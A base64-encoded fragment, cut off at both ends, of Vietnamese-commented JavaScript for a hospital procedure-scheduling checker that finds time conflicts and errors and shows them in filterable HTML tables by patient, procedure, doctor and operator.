oaC5vcGVyYXRvciB8fCAnS2jDtG5nIGPDsycpLnRyaW0oKS50b0xvd2VyQ2FzZSgpOw0KICAgIGlmICghY291bnRzQnlEYXRlW2RdKSBjb3VudHNCeURhdGVbZF0gPSB7fTsNCiAgICBjb3VudHNCeURhdGVbZF1bbl0gPSAoY291bnRzQnlEYXRlW2RdW25dIHx8IDApICsgMTsNCiAgfSk7DQogIGxldCBvdXRsaWVycyA9IDA7DQogIE9iamVjdC52YWx1ZXMoY291bnRzQnlEYXRlKS5mb3JFYWNoKG1hcCA9PiB7DQogICAgY29uc3QgZW50cmllcyA9IE9iamVjdC5lbnRyaWVzKG1hcCkuc29ydCgoYSxiKT0+YlsxXS1hWzFdKTsNCiAgICBjb25zdCB0b3AgPSBlbnRyaWVzWzBdOyBpZiAoIXRvcCkgcmV0dXJuOw0KICAgIGNvbnN0IHRvcE5hbWUgPSB0b3BbMF07DQogICAgZW50cmllcy5mb3JFYWNoKChbbmFtZSwgY250XSkgPT4geyBpZiAobmFtZSAhPT0gdG9wTmFtZSkgb3V0bGllcnMgKz0gY250OyB9KTsNCiAgfSk7DQogIHJldHVybiBvdXRsaWVyczsNCn0NCg0KLy8gxJDhur9tIGzhu5dpIHNhaSB0aOG7nWkgZ2lhbiAoa+G6v3QgdGjDumMgPD0gYuG6r3QgxJHhuqd1LCDEkeG7i25oIGThuqFuZyBzYWksIHNhaSBwaMO6dCBzbyB24bubaSBxdXkgxJHhu4tuaCwuLi4pDQpmdW5jdGlvbiBnZXRUaW1lRXJyb3JUb3RhbCgpIHsNCiAgLy8gxJDhur9tIMSRw7puZyB0aGVvIHPhu5EgaMOgbmcgbOG7l2kgxJFhbmcgaGnhu4NuIHRo4buLDQogIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOyAvLyB2w7luZyBi4bqjbmcgbOG7l2kgdGjhu51pIGdpYW4NCiAgaWYgKCFjb250YWluZXIpIHJldHVybiAwOw0KICByZXR1cm4gY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3JBbGwoJ3RyLmVycm9yLXJvdycpLmxlbmd0aDsNCn0NCg0KZnVuY3Rpb24gZ2V0Q29uZmxpY3RUb3RhbCgpIHsNCiAgLy8gxJDhur9tIMSRw7puZyB0aGVvIHPhu5EgaMOgbmcgeHVuZyDEkeG7mXQgdHJvbmcga+G6v3QgcXXhuqMNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0Qm9keScpOyAvLyB0Ym9keSBj4bunYSBi4bqjbmcga+G6v3QgcXXhuqMNCiAgaWYgKCF0Ym9keSkgcmV0dXJuIDA7DQogIHJldHVybiB0Ym9keS5xdWVyeVNlbGVjdG9yQWxsKCd0ci5jb25mbGljdC1yb3cnKS5sZW5ndGg7DQp9DQoNCg0KDQoNCg0KDQoNCg0KICAgICAgIGZ1bmN0aW9uIGRpc3BsYXlSZXN1bHRzKHByb2NlZHVyZXMsIHNraXBwZWRSb3dzID0gMCkgew0KICAgIGFsbFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzOw0KICAgIA0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KHByb2NlZHVyZXMubWFwKHAgPT4gcC5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0RXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0RXJyb3IuaW5uZXJIVE1MID0gb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MOyAvLyDEkOG7k25nIGLhu5kgbuG7mWkgZHVuZw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvckZpbHRlckVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0UHJvY2VkdXJlcyA9IHByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5jb25mbGljdCk7DQogICAgICAgICAgICBjb25zdCBjb25mbGljdENvdW50ID0gY29uZmxpY3RQcm9jZWR1cmVzLmxlbmd0aDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIE7hur91IGtow7RuZyBjw7MgbOG7l2ksIGN14buZbiB4deG7kW5nIHBo4bqnbiBr4bq/dCBxdeG6ow0KICAgIGlmIChlcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgICAgICBjb25zdCByZXN1bHRTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKTsNCiAgICAgICAgICAgIGlmIChyZXN1bHRTZWN0aW9uKSB7DQogICAgICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8ocmVzdWx0U2VjdGlvbiwgLTQwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSwgMzAwKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGZpbHRlckJ5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCg0KIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC50b2dnbGUoJ3Nob3ctZG9jdG9yJywgc2hvd0RvY3Rvcik7DQogICAgLy8gPT09PT0gMS4gTOG7jEMgVsOAIEhJ4buCTiBUSOG7iiBC4bqiTkcgS+G6vlQgUVXhuqIgS0nhu4JNIFRSQSBYVU5HIMSQ4buYVCA9PT09PQ0KICAgIGNvbnN0IGZpbHRlcmVkUHJvY2VkdXJlcyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuY29uZmxpY3QpIA0KICAgICAgICA6IGFsbFByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgJiYgcC5jb25mbGljdCk7DQoNCiAgICBjb25zdCByZXN1bHRCb2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsNCiAgICByZXN1bHRCb2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgLy8gTmjDs20gY8OhYyB0aOG7pyB0aHXhuq10IHh1bmcgxJHhu5l0IHbhu5tpIG5oYXUNCiAgICBjb25zdCBjb25mbGljdEdyb3VwcyA9IFtdOw0KICAgIGNvbnN0IHByb2Nlc3NlZFJvd3MgPSBuZXcgU2V0KCk7DQoNCiAgICBmaWx0ZXJlZFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgaWYgKCFwcm9jZXNzZWRSb3dzLmhhcyhwcm9jLnJvd0luZGV4KSkgew0KICAgICAgICAgICAgY29uc3QgZ3JvdXAgPSBbcHJvY107DQogICAgICAgICAgICBwcm9jZXNzZWRSb3dzLmFkZChwcm9jLnJvd0luZGV4KTsNCg0KICAgICAgICAgICAgLy8gVMOsbSB0aOG7pyB0aHXhuq10IGxpw6puIHF1YW4gdHJvbmcgeHVuZyDEkeG7mXQNCiAgICAgICAgICAgIGlmIChwcm9jLmNvbmZsaWN0UmVhc29uKSB7DQogICAgICAgICAgICAgICAgY29uc3QgY29uZmxpY3RNYXRjaGVzID0gcHJvYy5jb25mbGljdFJlYXNvbi5tYXRjaCgvQuG7h25oIG5ow6JuOiAoLio/KTxicj7igKIgTmfDoHk6ICguKj8pPGJyPuKAoiBUaOG7nWkgZ2lhbjogKC4qPyktL2cpOw0KICAgICAgICAgICAgICAgIGlmIChjb25mbGljdE1hdGNoZXMpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uZmxpY3RNYXRjaGVzLmZvckVhY2gobWF0Y2ggPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGF0aWVudE5hbWUgPSBtYXRjaC5tYXRjaCgvQuG7h25oIG5ow6JuOiAoLio/KTxicj4vKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGUgPSBtYXRjaC5tYXRjaCgvTmfDoHk6ICguKj8pPGJyPi8pWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZSA9IG1hdGNoLm1hdGNoKC9UaOG7nWkgZ2lhbjogKC4qPyktLylbMV07DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0UHJvYyA9IGZpbHRlcmVkUHJvY2VkdXJlcy5maW5kKHAgPT4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5wYXRpZW50TmFtZSA9PT0gcGF0aWVudE5hbWUgJiYgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5kYXRlID09PSBkYXRlICYmIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuZGlzcGxheVN0YXJ0ID09PSB0aW1lICYmDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIXByb2Nlc3NlZFJvd3MuaGFzKHAucm93SW5kZXgpDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29uZmxpY3RQcm9jKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdXAucHVzaChjb25mbGljdFByb2MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3NlZFJvd3MuYWRkKGNvbmZsaWN0UHJvYy5yb3dJbmRleCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNvbmZsaWN0R3JvdXBzLnB1c2goZ3JvdXApOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgIC8vIEhp4buDbiB0aOG7iyBr4bq/dCBxdeG6ow0KICAgIGNvbmZsaWN0R3JvdXBzLmZvckVhY2goZ3JvdXAgPT4gew0KICAgICAgICBncm91cC5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoJ2NvbmZsaWN0LXJvdycpOw0KICAgICAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnBhdGllbnROYW1lfSA8YnIvPiAke3Byb2MucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke3Byb2MuZGF0ZX08YnIvPiR7cHJvYy5kaXNwbGF5U3RhcnR9IC0gJHtwcm9jLmRpc3BsYXlFbmR9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iPiR7cHJvYy5kb2N0b3J9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJ0aW1lLXN1Z2dlc3Rpb24iPiR7cHJvYy5zdWdnZXN0aW9uIHx8ICdLaMO0bmcgY8OzIHh1bmcgxJHhu5l0J308L3RkPg0KICAgICAgICAgICAgYDsNCiAgICAgICAgICAgIHJlc3VsdEJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgLy8gVGjDqm0gZMOybmcgcGjDom4gY8OhY2gNCiAgICAgICAgaWYgKGdyb3VwLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIGNvbnN0IHNlcGFyYXRvciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICBzZXBhcmF0b3IuaW5uZXJIVE1MID0gJzx0ZCBjb2xzcGFuPSI4IiBjbGFzcz0iZ3JvdXAtc2VwYXJhdG9yIj48L3RkPic7DQogICAgICAgICAgICByZXN1bHRCb2R5LmFwcGVuZENoaWxkKHNlcGFyYXRvcik7DQogICAgICAgIH0NCiAgICB9KTsNCg0KICAgIC8vIE7hur91IGtow7RuZyBjw7MgbmjDs20gbsOgbyB0aMOsIHRow6ptIGTDsm5nIGLDoW8gIktow7RuZyBjw7MgbOG7l2kiDQogICAgaWYgKGNvbmZsaWN0R3JvdXBzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiY2xhc3M9ImhlcmItcm93IGNvbmZsaWN0LXJvdyI+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3RkPg0KICAgICAgICBgOw0KICAgICAgICByZXN1bHRCb2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfQ0KDQogICAgLy8gPT09PT0gMi4gTOG7jEMgVsOAIEhJ4buCTiBUSOG7iiBC4bqiTkcgTOG7lkkgPT09PT0NCmNvbnN0IG9wZXJhdG9yRXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpLnZhbHVlOw0KIGNvbnN0IGZpbHRlcmVkRXJyb3JzID0gb3BlcmF0b3JFcnJvciA9PT0gJ2FsbCcgDQogICA/IGVycm9yTG9nIA0KICAgOiBlcnJvckxvZy5maWx0ZXIoZXJyb3IgPT4NCiAgICAgICBlcnJvci5kZXRhaWxzICYmDQogICAgICBlcnJvci5kZXRhaWxzLm9wZXJhdG9yICYmDQogICAgICAgZXJyb3IuZGV0YWlscy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3JFcnJvci5yZXBsYWNlKC8sL2csICcnKQ0KICAgICk7DQoNCiAgICAvLyBIaeG7g24gdGjhu4sgbOG7l2kgxJHDoyBs4buNYw0KICAgIGNvbnN0IGVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgaWYgKGZpbHRlcmVkRXJyb3JzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+IDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNSIgY2xhc3M9ImVycm9yLWRldGFpbCI+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3RkPjwvdHI+PC90Ym9keT48L3RhYmxlPmA7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCg0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBpZiAoZXJyb3IuZGV0YWlscykgew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnByb2NlZHVyZSB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCgkJCQk8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iPiR7ZXJyb3IuZGV0YWlscy5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5vcGVyYXRvciA/IGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgOiAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLmRldGFpbHMubmdheVRodWNIaWVuIHx8IChlcnJvci5kZXRhaWxzLmRhdGUgfHwgJ0tow7RuZyBjw7MnKX0gPGJyLz4kew0KICAgICAgICAgICAgICAgICAgICBlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsycNCiAgICAgICAgICAgICAgICB9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0IChRdXkgxJHhu4tuaDogJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkfSBwaMO6dClgIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI1IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSAke2Vycm9yLnJvdyA/ICcoRMOybmcgJyArIGVycm9yLnJvdyArICcpJyA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0NCiAgICB9KTsNCg0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQoNCmZ1bmN0aW9uIGRpc3BsYXlGaWx0ZXJlZEVycm9ycyhmaWx0ZXJlZEVycm9ycykgew0KICAgIGNvbnN0IGVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgDQogICAgaWYgKGZpbHRlcmVkRXJyb3JzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGlmIChlcnJvci5kZXRhaWxzKSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnBhdGllbnROYW1lIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucHJvY2VkdXJlIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZSA/IGAke2Vycm9yLmRldGFpbHMuc3RhcnRUaW1lfSAtICR7ZXJyb3IuZGV0YWlscy5lbmRUaW1lfWAgOiAnS2jDtG5nIGPDsyd9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkID8gYCR7ZXJyb3IuZGV0YWlscy5hY3R1YWx9IHBow7p0ICAgKFF1eSDEkeG7i25oOiAke2Vycm9yLmRldGFpbHMuZXhwZWN0ZWR9IHBow7p0KWAgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjYiIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9ICR7ZXJyb3Iucm93ID8gJyhEw7JuZyAnICsgZXJyb3Iucm93ICsgJyknIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfQ0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gbG9nRXJyb3IobWVzc2FnZSwgcm93ID0gbnVsbCwgZGV0YWlscyA9IG51bGwpIHsNCiAgICAgICAgICAgIGVycm9yTG9nLnB1c2goew0KICAgICAgICAgICAgICAgIG1lc3NhZ2UsDQogICAgICAgICAgICAgICAgcm93LA0KICAgICAgICAgICAgICAgIGRldGFpbHMsDQogICAgICAgICAgICAgICAgdGltZXN0YW1wOiBuZXcgRGF0ZSgpLnRvTG9jYWxlVGltZVN0cmluZygpLA0KICAgICAgICAgICAgICAgIHVzZXI6IGN1cnJlbnRVc2VyDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KDQpmdW5jdGlvbiBkaXNwbGF5RXJyb3JzKCkgew0KICAgIGNvbnN0IGVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgDQogICAgaWYgKGVycm9yTG9nLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgZG9jdW1lbnQuZ2V0